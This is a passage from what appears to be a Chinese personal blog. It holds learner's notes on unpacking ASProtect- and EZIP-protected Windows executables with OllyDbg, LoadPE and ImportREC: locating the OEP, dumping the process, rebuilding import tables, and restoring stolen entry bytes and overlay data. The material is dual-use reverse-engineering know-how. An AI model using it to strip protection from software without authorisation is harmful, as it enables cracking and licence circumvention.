<li>adb pull &lt;手机文件&gt;&lt;Windows文件路径&gt;</li>
<li>Ctrl+F11横竖屏切换（现在貌似废弃了，在…中有）。</li>
</ul>
<p>上述的许多命令用eclipse基本可以代替，所一这里不过多的赘述。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/18/adb-Common-method/" data-id="ck5xij362001oe0wjgbtwgomd" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android%E5%AD%A6%E4%B9%A0/" rel="tag">Android学习</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-NewSectionFindLoseData" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/18/NewSectionFindLoseData/" class="article-date">
  <time datetime="2020-01-18T08:51:35.000Z" itemprop="datePublished">2020-01-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/18/NewSectionFindLoseData/">NewSectionFindLoseData</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="包含壳的脱壳"><a href="#包含壳的脱壳" class="headerlink" title="包含壳的脱壳"></a>包含壳的脱壳</h1><p>有的时候我们丢失的数据过多，如果我们要找到我们所有丢失的数据基本上是不是太可能的，这个时候我们将壳的一部分包含在程序当中，当不需要做太大的动作的时候，我们的这种做法还是可以的，具体操作如下：</p>
<h2 id="AsProtect找丢失的数据区段"><a href="#AsProtect找丢失的数据区段" class="headerlink" title="AsProtect找丢失的数据区段"></a>AsProtect找丢失的数据区段</h2><p>首先我们先找到我们假的OEP，这个壳子我们还是用最后一次异常法：我们先隐藏OD，其实可以用OD插件的options设置开启自动隐藏（小技巧），这个时候我们设置我们的异常为：<br><img src="img1.jpg" alt="异常设置"><br>然后我们用最后一次异常法（shift+F9），这里一共是27次，在26次的时候我们我们调节我们的异常这个地方我不知道其他人为啥可以，但我就是不可以，我们这个时候将我们的异常调节为：<br><img src="img2.jpg" alt="异常设置"><br>然后我们在最近的一个retn下端，然后执行过去：<br><img src="img3.jpg" alt="retn处"><br>这个时候注意看我在堆栈处的箭头，在这个地方下硬件下硬件写入断点（具体原因只有当时研究的人知道），然后我们的程序会跑到一个jmp处，我们删除硬件写入断点，然后往下跟句，然后我们当前的位置：<br><img src="img4.jpg" alt="适合找数据的位置"><br>塑这个位置使我们比较合适的找数据的位置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00CC696F    BB A2000000     MOV EBX,0A2</span><br><span class="line">00CC6974    0BDB            OR EBX,EBX</span><br><span class="line">00CC6976    75 07           JNZ SHORT 00CC697F</span><br><span class="line">00CC6978    894424 1C       MOV DWORD PTR SS:[ESP+1C],EAX</span><br><span class="line">00CC697C    61              POPAD</span><br><span class="line">00CC697D    50              PUSH EAX</span><br><span class="line">00CC697E    C3              RETN</span><br><span class="line">00CC697F    E8 00000000     CALL 00CC6984</span><br><span class="line">00CC6984    5D              POP EBP</span><br></pre></td></tr></table></figure>
<p>然后我们用我们的LoadPE进行脱壳：<br>在这里我们先纠正镜像大小，然后完全转存。<br>下面比较重要，注意看我们需要区域转存：<br><img src="img5.jpg" alt="区域转存"><br><img src="img6.jpg" alt="区域转存"><br>注意我们选择的区段要包含我们刚才停留的位置：这个时候我们使用LoadPE给我们的PE编辑器，打开文件，点击编辑区段：<br><img src="img7.jpg" alt="区段编辑"><br><img src="img8.jpg" alt="区段编辑"><br>导入我们刚才的区段。<br><img src="img9.jpg" alt="计算区段"><br>这里我们用我们当前的位置减去我们的基址（也就是400000），得到我们的虚拟地址，然后我们保存一下。<br>这个时候我们重建PE，但在重建之前我们需要设置：<br><img src="img10.jpg" alt="重建PE"><br>只留下验证PE就好了，我们重建确定。</p>
<h2 id="AsProtect找假OEP"><a href="#AsProtect找假OEP" class="headerlink" title="AsProtect找假OEP"></a>AsProtect找假OEP</h2><p>然后我们找我们假的OEP，这个地方我们很简单，我们在我们的code断下内存访问中断，然后我们运行，运行到这个地方：<br><img src="img11.jpg" alt="假OEP"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">004F27CF    FF15 9CC25200   CALL DWORD PTR DS:[52C29C]</span><br><span class="line">004F27D5    33D2            XOR EDX,EDX</span><br><span class="line">004F27D7    8AD4            MOV DL,AH</span><br><span class="line">004F27D9    8915 34306900   MOV DWORD PTR DS:[693034],EDX</span><br><span class="line">004F27DF    8BC8            MOV ECX,EAX</span><br><span class="line">004F27E1    81E1 FF000000   AND ECX,0FF</span><br><span class="line">004F27E7    890D 30306900   MOV DWORD PTR DS:[693030],ECX</span><br><span class="line">004F27ED    C1E1 08         SHL ECX,8</span><br><span class="line">004F27F0    03CA            ADD ECX,EDX</span><br><span class="line">004F27F2    890D 2C306900   MOV DWORD PTR DS:[69302C],ECX</span><br></pre></td></tr></table></figure>
<p>我们这个时候重建输入表，import REC我们填写我们的假OEP，然后查找：<br><img src="img12.jpg" alt="重建IAT"><br>我们用等级一修复，还剩下六个，我们用ASProcet的插件进行搜索，最后得到的结果：<br><img src="img13.jpg" alt="重建IAT"><br>我们全部都找到了。<br>我们修改我们的OEP，修改为我们的假OEP地址的相对地址：0x00CC696F-0x00400000=0x008C696F<br><img src="img14.jpg" alt="修改OEP"><br>然后抓取修复就可以了。<br><strong>PS：但在这个地方，我却没有成功，不知道为什么。但是操作确实是这个样子的，可能是OD的版本不同，或者我查看的这个程序是在是太老了的原因，这也算是给自己留下的一个疑惑吧，脱壳学习，先暂停一下，是时候复习一下Win32了！</strong></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/18/NewSectionFindLoseData/" data-id="ck5xij35m0018e0wj0h7p7qb6" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%B1%E5%A3%B3%E7%AF%87/" rel="tag">脱壳篇</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-LoseData-find" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/17/LoseData-find/" class="article-date">
  <time datetime="2020-01-17T03:57:19.000Z" itemprop="datePublished">2020-01-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/17/LoseData-find/">LoseData-find</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="丢失的程序头部"><a href="#丢失的程序头部" class="headerlink" title="丢失的程序头部"></a>丢失的程序头部</h1><p>有的程序加壳之后将原本OEP的部分头部给去除掉了，放在了自身的壳里面，导致我们脱壳之后我们的程序可能入口会出错，这个时候我们就需要自己补充上去：</p>
<h2 id="丢失数据的OEP"><a href="#丢失数据的OEP" class="headerlink" title="丢失数据的OEP"></a>丢失数据的OEP</h2><p>首先我们需要找到他给我们的OEP，这里ACProcet这个壳比较特殊，我们需要用插件HideOD进行隐藏，然后将我们的调试选项，取消勾选INT3的异常：<br><img src="img1.jpg" alt="调试设置"><br><img src="img2.jpg" alt="隐藏OD"><br>这个时候我们运行程序，使用最后一次异常，将我们的SE栈值下上硬件断点，这里为什么不下INT3断点呢，其实是这个壳有一定的保护系统，下上会出错（别人说的），然后我们的程序会进入下面这个地方：<br><img src="img3.jpg" alt="关键处"><br>这个时候我们看到RETN就到了我们的假的OEP，这个时候我们运行到RETN，然后对我们的code代码段进行下访问断点：<br><img src="img4.jpg" alt="返回处"><br><img src="img5.jpg" alt="访问中断"><br>这个时候运行程序，我们的程序就会到假的OEP：<br><img src="img6.jpg" alt="丢失数据的OEP"><br>这个时候我们知道之后，其实已经错过了找我们的丢失数据的机会，我们重新来过：<br>在我们下断在RETN的时候我们下12ffc0这个硬件访问断点，<br><img src="img7.jpg" alt="硬件断点"><br>然后他会带我们跳到：<br><img src="img8.jpg" alt="丢失的数据"><br>我们复制二进制数据，然后相同的方法到达我们刚才的OEP，把那一段给粘贴上去：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">55 8B EC 6A FF</span><br></pre></td></tr></table></figure>
<p>我们找到假的OEP其实有个坑，程序代码会混淆，这个时候我们Ctrl+A分析代码就好了，然后在上面5个字节粘贴我们的二进制：<br><img src="img9.jpg" alt="补充数据"><br>这个时候我们将我们当前的EIP进行转到我们的补充好的数据上面，然后进行脱壳：<br><img src="img10.jpg" alt="修改EIP"><br>这个时候我们打开LoadPE，修改我们的镜像，然后拖出来，之后的操作和我们之前的都是一样的（import REC需要修复数据），然后生成我们的脱壳程序。<br>但是我们发现我们的程序还是没办法运行起来。这里别人说应该是保护的一个机制：<br><img src="img11.jpg" alt="启动失败"><br>我们去到我们没有脱壳前程序的OEP，然后将我们的一些丢失数据放回去这个样子他就检测不出来了。<br><img src="img12.jpg" alt="原先OEP"><br>入口的OEP是AC000，我们跳过去，把我们的二进制数据粘贴上去，然后用jmp跳转跳转到我们的真正的OEP：<br><img src="img13.jpg" alt="假OEP"><br>修改完毕之后我们保存（OD自带的保存修改），但是这个时候还是不行，因为我们现在PE头部的OEP还是我们真正的OEP，我们用LoadPE指过去：<br><img src="img14.jpg" alt="修改入口点地址"><br>我们点击保存，确定就好了，但是我们发现我们PEid还是找不到壳子，这个就是后话了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/17/LoseData-find/" data-id="ck5xij35h0014e0wj0c963k88" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%B1%E5%A3%B3%E7%AF%87/" rel="tag">脱壳篇</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-OverLay-UnShell" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/16/OverLay-UnShell/" class="article-date">
  <time datetime="2020-01-16T12:40:41.000Z" itemprop="datePublished">2020-01-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/16/OverLay-UnShell/">OverLay-UnShell</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>当我们在查壳的时候碰到覆盖（OverLay）的时候，我们就需要如下操作：<br><img src="img10.jpg" alt="查壳"></p>
<h1 id="OverLay数据处理"><a href="#OverLay数据处理" class="headerlink" title="OverLay数据处理"></a>OverLay数据处理</h1><p>今天刚学习了这种数据处理的方法，具体原因之后深入分析，其实也就是区段数据的一个补充，首先需要找到我们的多余数据，分为两种简单方法：</p>
<h2 id="数据查找法"><a href="#数据查找法" class="headerlink" title="数据查找法"></a>数据查找法</h2><p>这种方法比较简单也比较直接，我们从最底部自下往上寻找一大片00，用快捷键就可以了，记住是搜索没有脱壳的数据：<br><img src="img1.jpg" alt="查找方法"><br><img src="img2.jpg" alt="结果数据"><br>我们从00后面的数据复制，最好用shift范围性复制，复制到结尾。<br><img src="img3.jpg" alt="复制数据"></p>
<h2 id="区段查找法"><a href="#区段查找法" class="headerlink" title="区段查找法"></a>区段查找法</h2><p>这个通过LoadPE查找最后的一个区段的范围，然后通过真实的RVA+Size计算出来我们要找的数据：<br><img src="img4.jpg" alt="PE计算"><br>8800+400=8C00，我们这里Ctrl+G进行转到，然后看到和我们刚才一样的地方，同样复制。<br><img src="img5.jpg" alt="地址转到"></p>
<h1 id="修复数据"><a href="#修复数据" class="headerlink" title="修复数据"></a>修复数据</h1><p>复制完毕之后我们打开我们脱壳完毕的程序，然后拖到底部，然后将我们刚才的数据复制上去。<br><img src="img6.jpg" alt="粘贴数据"><br>粘贴上去会询问我们，我们点击确定就好了：<br><img src="img7.jpg" alt="确定"><br>之后我们就会看到数据变成这个样子的：<br><img src="img8.jpg" alt="修改的数据"><br>我们Ctrl+S保存，然后用PEid进行查壳：<br><img src="img9.jpg" alt="查壳"><br>我们发现我们的程序脱壳完毕，并且后面还有一个“[覆盖]”，运行也正常这个样子就算是可以了的。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/16/OverLay-UnShell/" data-id="ck5xij35s001de0wjhl97ax8t" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%B1%E5%A3%B3%E7%AF%87/" rel="tag">脱壳篇</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-IF-UnShell" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/16/IF-UnShell/" class="article-date">
  <time datetime="2020-01-16T07:55:00.000Z" itemprop="datePublished">2020-01-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/16/IF-UnShell/">IF-UnShell</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="快捷判断找OEP"><a href="#快捷判断找OEP" class="headerlink" title="快捷判断找OEP"></a>快捷判断找OEP</h2><p>有的时候我们在脱壳的时候经常其实眼睛观察就能观察到OEP的位置（比较大的一个跨区段跳转），但是这个时候我们的跳转并没有实现，原因有很多，比较典型的原因就是我们的输入表重新构建的工作并没有完成，所以紧跟其后的就是我们的输入表重建工作，比较典型的就是下面这段代码：<br><img src="img1.jpg" alt="关键跳"><br>我们来看这句，这么多字节，很明显的啊，就是一个跨区段的跳转，但是我们发现这个时候我们并没有跳转实现，我们先转过去，发现确实是OEP，但是我们dump修复的时候我们发现我们发现不了任何一个输入表，这就对了，<strong>下面的这一下跳转其实就是我们的输入表重建工作，比较明显的就是我们的我们寄存器中会出现输入表的一些信息</strong>：<br><img src="img2.jpg" alt="关键跳"><br>这个时候我们要注意了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0043E633    09C0            or eax,eax                               ; 跑跑排行.0043E746</span><br><span class="line">0043E635  - 0F84 E3BDFCFF   je 跑跑排行.0040A41E</span><br></pre></td></tr></table></figure>
<p>我们可以看到，只有只有在我们的eax的值为0的时候我们的跳转才会实现，这个时候OD提供给了我们一个很强大的功能就是跳转断点，我们设置只有在eax==0的时候才会停下来就好了，具体操作如下：<br><img src="img3.jpg" alt="条件断点"><br>键入我们的条件：eax==0<br><img src="img4.jpg" alt="条件"><br>然后我们运行程序：<br><img src="img5.jpg" alt="断下"><br>这个时候我们跟过去就是我们的OEP了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/16/IF-UnShell/" data-id="ck5xij352000ke0wj5ixz3oj4" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%B1%E5%A3%B3%E7%AF%87/" rel="tag">脱壳篇</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-special-UnShell" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/16/special-UnShell/" class="article-date">
  <time datetime="2020-01-16T07:36:34.000Z" itemprop="datePublished">2020-01-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/16/special-UnShell/">special-UnShell</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="是否正在调试法"><a href="#是否正在调试法" class="headerlink" title="是否正在调试法"></a>是否正在调试法</h2><p>有的时候一些壳会有防止调试的检测，这个时候我们就可以下：IsDebuggerPresent这个断点，然后返回到用户组，下面应该就有OEP的一些运算了，手下我们先下断点：<br><img src="img1.jpg" alt="下断点"><br>然后我们执行到程序领空：<br>我们看到了下面这几句话：<br><img src="img2.jpg" alt="OEP计算"><br>这个时候我们执行完这两句，我们看edi的值：<br><img src="img3.jpg" alt="EDI"><br>这个时候我们转到EDI的这个地址：<br><img src="img4.jpg" alt="OEP"><br>这个时候F4运行到就好了！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/16/special-UnShell/" data-id="ck5xij36u001ve0wjdamj4cz9" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%B1%E5%A3%B3%E7%AF%87/" rel="tag">脱壳篇</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="w-track-API" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/16/track-API/" class="article-date">
  <time datetime="2020-01-16T02:09:14.000Z" itemprop="datePublished">2020-01-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/16/track-API/">track API</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="一个文件修复"><a href="#一个文件修复" class="headerlink" title="一个文件修复"></a>一个文件修复</h2><p>import REC跟踪无效的函数，这样我们才能够准确无误的删除一些真正无效的函数，我们首先先找到程序的OEP，这里最后一次异常法就可以到达：<br><img src="img1.jpg" alt="OEP"><br>这个时候我们dump出来，运行的时候发现：<br><img src="img2.jpg" alt="错误"><br>这个时候我们用import REC进行修复，常规操作，我们转储的文件中，但是我们发现还是会出来相同的问题，那么我们该如何办呢？</p>
<h2 id="跟踪出真正的函数地址"><a href="#跟踪出真正的函数地址" class="headerlink" title="跟踪出真正的函数地址"></a>跟踪出真正的函数地址</h2><p>我们首先搜索出函数的输入表（这里验证过了）：<br>然后我们显示出无效的函数：<br><img src="img3.jpg" alt="无效函数"><br>这个时候我们不要急着去删除他，我们先右键跟踪这几个函数地址，看看能不能跟踪出真正的函数地址：<br><img src="img4.jpg" alt="跟踪函数"><br>然后挨个尝试，发现第一二个都是无法看到的，但是我们用到第三个的时候，我们发现import REC卡死了，这个时候，我们就需要打开新的需要脱壳的程序，然后重新加载，然后我们跟踪函数，和上面的操作一样，这个时候import REC会给我们一个结果：<br><img src="img5.jpg" alt="跟踪结果"><br>我们可以看到import REC给了我们结果，不仅给了我们地址，还给了我们的函数名，但是不知道是不是bug，我在跟踪的时候待脱壳程序自动关闭了，但是这个不影响，然后我们发现还有5个无法修复，那么没办法我们尝试着去删除他们（在这里有个坑，不知道是不是这个程序的bug，我们点击删除不行，只能点击那个剪切），完事之后我们修复抓取文件，导出就会发现程序脱壳完毕了：<br><img src="img6.jpg" alt="脱壳完毕"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/16/track-API/" data-id="ck5xij370001xe0wj1dyr0lzn" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%B1%E5%A3%B3%E7%AF%87/" rel="tag">脱壳篇</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Rebuilt-input-list2" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/16/Rebuilt-input-list2/" class="article-date">
  <time datetime="2020-01-16T00:04:44.000Z" itemprop="datePublished">2020-01-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/16/Rebuilt-input-list2/">Rebuilt input list2</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>今天记录一下，再重新构建PE表的时候出现问题实时的解决办法，这是一个EZIP的壳，我们很简单的就到了我们的OEP：<br><img src="img1.jpg" alt="OEP"><br>然后我们进行dump文件，首先我们用OD自带的插件进行dump。<br>然后运行dump出来的文件，会出现出错的问题：<br><img src="img2.jpg" alt="错误"><br>解决办法如下：</p>
<h2 id="LoadPE纠正镜像"><a href="#LoadPE纠正镜像" class="headerlink" title="LoadPE纠正镜像"></a>LoadPE纠正镜像</h2><p><img src="img3.jpg" alt="纠正镜像"></p>
<h2 id="import-REC修复转储文件"><a href="#import-REC修复转储文件" class="headerlink" title="import REC修复转储文件"></a>import REC修复转储文件</h2><p>我们可以看到import REC已经正确的查找到了我们需要的东西<br><img src="img4.jpg" alt="修复转储文件"><br>我们接下来获取输入表，剪切输入表dump出来就好了。<br>但是我们发现我们又一次的出现之前的错误！<br><img src="img5.jpg" alt="再次出现错误"></p>
<h2 id="LoadPE重构PE结构"><a href="#LoadPE重构PE结构" class="headerlink" title="LoadPE重构PE结构"></a>LoadPE重构PE结构</h2><p>我们用LoadPE重新构建一下PE的结构，<br><img src="img6.jpg" alt="选择重建PE"><br>然后我们点击打开，会出现这样子的一个窗口：<br><img src="img7.jpg" alt="查看成功"><br>这个时候我们的程序就正常运行起来了。<br>并且壳子也就没有了，其实我们一开始不用OD自带的插件脱壳，用LoadPE去拖这个壳子，import REC去修复是遇不到这个问题的。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/16/Rebuilt-input-list2/" data-id="ck5xij35w001ie0wjg2e5bjob" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%B1%E5%A3%B3%E7%AF%87/" rel="tag">脱壳篇</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Common-Unshell2" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/14/Common-Unshell2/" class="article-date">
  <time datetime="2020-01-14T11:12:49.000Z" itemprop="datePublished">2020-01-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/14/Common-Unshell2/">Common-Unshell2</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="比较常用的脱壳技巧2"><a href="#比较常用的脱壳技巧2" class="headerlink" title="比较常用的脱壳技巧2"></a>比较常用的脱壳技巧2</h1><p>之前文章介绍了一些比较常见的，下面再介绍几种</p>
<h2 id="VirtualFree法1"><a href="#VirtualFree法1" class="headerlink" title="VirtualFree法1"></a>VirtualFree法1</h2><p>这种方法首先是下VirtualFree的断点，执行到我们的用户组代码，然后搜索push 8000，之后我们就往下跟踪，然后大跳转跟过去，一般就到了我们的OEP，具体操作看截图：<br>首先下端之后运行，然后回到我们的程序领空。<br><img src="img1.jpg" alt="从VirtualFree回到程序"><br>然后接下来我们搜索push 8000，进行下断。<br><img src="img2.jpg" alt="在push 8000下断"><br>最后就来到了我们的OEP</p>
<h2 id="VirtualFree法2"><a href="#VirtualFree法2" class="headerlink" title="VirtualFree法2"></a>VirtualFree法2</h2><p>这个更加简单，我们下VirtualFree的断点，然后执行两次，意思就是在第二次断在VirtualFree的时候我们返回到程序领空，继续单步就好了。</p>
<h2 id="mov转移法"><a href="#mov转移法" class="headerlink" title="mov转移法"></a>mov转移法</h2><p>就是说当我们刚进入程序的时候，如果首句出现mov指令的时候，我们给他后面的地址下断点，例如：<br><img src="img3.jpg" alt="查看数据"><br>然后运行，跟下去就好了<br>但在这里我们看到一个函数片段，也就是有一个retn，我们在片段下方进行下断：<br><img src="img4.jpg" alt="下断"><br>然后运行，继续往下跟踪，就到了OEP。</p>
<h2 id="VirtualAlloc法"><a href="#VirtualAlloc法" class="headerlink" title="VirtualAlloc法"></a>VirtualAlloc法</h2><p>这个法子和VirtualFree法2基本没差别，一个操作方法，无非下的函数变了，但是后面跟踪的会有点长。</p>
<h2 id="最后一次异常法"><a href="#最后一次异常法" class="headerlink" title="最后一次异常法"></a>最后一次异常法</h2><p>首先我们先将OD中的所有异常全取消掉，然后重新载入程序，操作如下：<br><img src="img5.jpg" alt="设置OD"><br>然后我们运行程序，程序会中断，直到我们运行N次之后，程序顺利跑起来了，那我们再次重新运行，然后运行N-1次，查看SE（异常）处理器在堆栈中记录的地址：<br><img src="img6.jpg" alt="SE处理器地址"><br>然后转到这个地址，接下来的操作和我们的mov转移法相同了。（不要忘记调节回去哦！）</p>
<h2 id="at-GetVersion"><a href="#at-GetVersion" class="headerlink" title="at GetVersion"></a>at GetVersion</h2><p>程序就会运行到GetVersion，然后我们在段尾下端，然后返回去，发现你发现你现在就在OEP下方，嘻嘻。<br><img src="img7.jpg" alt="OEP附近"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/14/Common-Unshell2/" data-id="ck5xij34u000ce0wj8v0m8vs8" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%B1%E5%A3%B3%E7%AF%87/" rel="tag">脱壳篇</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Rebuilt-input-list" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/14/Rebuilt-input-list/" class="article-date">
  <time datetime="2020-01-14T09:18:45.000Z" itemprop="datePublished">2020-01-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/14/Rebuilt-input-list/">Rebuilt input list</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="找OEP的一个小技巧"><a href="#找OEP的一个小技巧" class="headerlink" title="找OEP的一个小技巧"></a>找OEP的一个小技巧</h1><p>我们载入程序，但在这里我发现了一个小问题，我用之前的一个OD载入之后我进入的却是系统的领空，而且一直进入不了用户组的代码，如下图所示：<br><img src="img1.jpg" alt="未进入程序领空"><br>但是我重换了一个比较基础的OD却发现是停留在程序的领空，如下图所示：<br><img src="img2.jpg" alt="程序领空"><br>这个时候我们先暂且不去深究这个的原因，之后再去研究具体的错误设置。<br>这个程序我们使用单步跟踪法来进行脱壳。<br>一步一步的往下跟踪，直到这个地方：<br><img src="img3.jpg" alt="程序OEP关键跳转"><br>我们可以看到这个时候的jnz是准备跳过去，但是我们发现塔下一个CALL却是call了一个[EBX+C]，这个地方就是比较关键的地方，因为一般壳为了保护自身，都会喜欢将地址转换到一些寄存在加偏移的一个相对基址寻址的地方，我们修改我们标志寄存器的值，让他不进行跳转，然后步入，我们会进入这个地方：<br><img src="img4.jpg" alt="程序OEP"><br>这里我们比较要注意的地方是，OD在这个地方我们一般要进行分析代码，也就是Ctrl+A，有的时候壳非常喜欢这个寄存器间接跳转，我们可以用回车键，或者Ctrl+G跳转到那个位置，看看像不像，然后选择步入。</p>
<h1 id="重建输入表"><a href="#重建输入表" class="headerlink" title="重建输入表"></a>重建输入表</h1><p>接着上面的，我们用我们常用的方法，进行dump，这里不演示了，我就直接脱掉。<br>这个时候我们在使用import REC的时候我们发现，貌似所有的函数都是无效的，这个时候我们就需要进行手动修改了，这里我提供两种方法：</p>
<h2 id="第一种：快速搜索法"><a href="#第一种：快速搜索法" class="headerlink" title="第一种：快速搜索法"></a>第一种：快速搜索法</h2><p>其实虽然import REC给我们的不是很正确，但是我们DD过去看一下：<br><img src="img5.jpg" alt="输入表附近"><br>这个时候我们自己定位一下，看一下上下方否是一片0的地方，从头拉到尾。<br><img src="img6.jpg" alt="输入表头部"><br><img src="img7.jpg" alt="输入表结尾"><br>这个时候就是可以了的，我们输入起始的RVA：2500，大小0x538,这个大小如果不是太确定，我们可以使用1000，但不是太建议，特殊情况下不要了，这个时候我们常规方法进行dump。</p>
<h2 id="第二种：CALL地址搜索法"><a href="#第二种：CALL地址搜索法" class="headerlink" title="第二种：CALL地址搜索法"></a>第二种：CALL地址搜索法</h2><p>这个方法比较直接，我们可以直接看他OEP下方CALL的地址，例如：<br><img src="img8.jpg" alt="快速CALL定位输入表"><br>只要是下方的CALL地址就行，这个时候就到输入表的头部了，然后就可以了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/14/Rebuilt-input-list/" data-id="ck5xij35x001ke0wj3kxqho6o" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%B1%E5%A3%B3%E7%AF%87/" rel="tag">脱壳篇</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-LoadPE-and-importREC" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/13/LoadPE-and-importREC/" class="article-date">
  <time datetime="2020-01-13T01:57:36.000Z" itemprop="datePublished">2020-01-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/13/LoadPE-and-importREC/">LoadPE and importREC</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
